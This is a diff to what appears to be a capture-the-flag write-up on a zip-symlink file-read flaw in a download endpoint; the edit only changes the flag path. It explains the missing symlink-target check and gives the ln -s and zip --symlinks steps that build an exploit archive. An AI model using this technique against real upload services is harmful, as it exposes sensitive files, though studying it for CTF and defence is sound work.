@@ -33,7 +33,7 @@ The download endpoint then calls `send_file(file_path, ...)`, which follows syml
 return send_file(file_path, as_attachment=True, download_name=download_name)
 ```
 
-Path traversal for the destination is blocked by a `startswith` check, but the *target* of the symlink is never validated — it may point anywhere on the filesystem, including `/etc/flag.txt` or any other sensitive file.
+Path traversal for the destination is blocked by a `startswith` check, but the *target* of the symlink is never validated — it may point anywhere on the filesystem, including `/etc/flag/flag` or any other sensitive file.
 
 ---
 
@@ -43,7 +43,7 @@ Path traversal for the destination is blocked by a `startswith` check, but the *
 
 ```bash
 # 1. Create a symlink pointing at the flag
-ln -s /etc/flag.txt flag.link
+ln -s /etc/flag/flag flag.link
 
 # 2. Package it into a ZIP preserving the symlink attribute
 zip --symlinks evil.zip flag.link
